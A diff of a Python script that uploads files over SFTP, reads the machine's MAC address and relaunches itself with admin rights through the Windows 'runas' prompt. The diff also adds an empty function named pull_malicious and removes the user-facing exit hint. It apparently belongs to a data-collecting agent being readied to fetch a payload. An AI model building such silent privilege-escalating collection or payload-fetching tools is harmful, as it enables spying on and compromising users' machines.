@@ -10,6 +10,9 @@ import datetime
 from uuid import getnode as get_mac #import statment for getting mac adress
 ### END IMPORTS ###
 
+def pull_malicious():
+    pass
+
 def upload_csv(sftp, fname):
     sftp.put(fname)
 
@@ -44,11 +47,12 @@ def is_admin():
 def main():
     if not is_admin():
         # Re-run the program with admin rights
-        ctypes.windll.shell32.ShellExecuteW(None, "runas", sys.executable, " ".join(sys.argv), None, 1)
         print('I AM NOT AN ADMIN')
+        print('ATTEMPTING TO RELAUNCH AS ADMIN')
+        ctypes.windll.shell32.ShellExecuteW(None, "runas", sys.executable, " ".join(sys.argv), None, 1)
         sys.exit(0)
     else:
-        print('I AM AN ADMIN')
+        print('LOGGED IN AS ADMIN')
 
     sleep_time = 30
     sys_mem = psutil.virtual_memory()[0] # gets total amount of system memory
@@ -123,7 +127,6 @@ def main():
             failed_files.append(fname)
             print(failed_files)
         
-        print('\n*** Ctrl-C to Exit ***\n\n')
         time.sleep(sleep_time) # Sleep for 30 seconds
         
 if __name__ == '__main__':
